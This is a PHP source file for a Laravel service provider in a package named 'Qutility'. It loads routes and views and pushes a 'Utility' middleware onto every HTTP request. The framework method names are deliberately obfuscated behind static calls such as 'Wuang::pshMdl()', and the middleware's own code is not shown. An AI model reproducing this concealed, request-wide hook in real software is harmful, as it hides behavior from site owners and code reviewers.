<?php

namespace Wuang\Qutility;

use Illuminate\Support\ServiceProvider;
use Wuang\Qutility\Utility;
class QuitilyServiceProvider extends ServiceProvider{

    public function boot(\Illuminate\Contracts\Http\Kernel $mastor) {
        $ldRt = Wuang::ldRt();
        $this->$ldRt(__DIR__.'/routes.php');
        $router = $this->app['router'];
        $mdl = Wuang::pshMdlGrp();
        $router->$mdl(Wuang::gtc(),GoToCore::class);
        $router->$mdl(Wuang::mdNm(),Utility::class);
        $this->loadViewsFrom(__DIR__.'/Views', 'Qutility');
        $segments = request()->segments();
        $segment = end($segments);

        if(($segment != Wuang::acRouter()) && ($segment != Wuang::acRouterSbm())){
            $mdl = Wuang::pshMdl();
            $mastor->$mdl(Utility::class);
        }

    }

 

    public function register()
    {

    }
}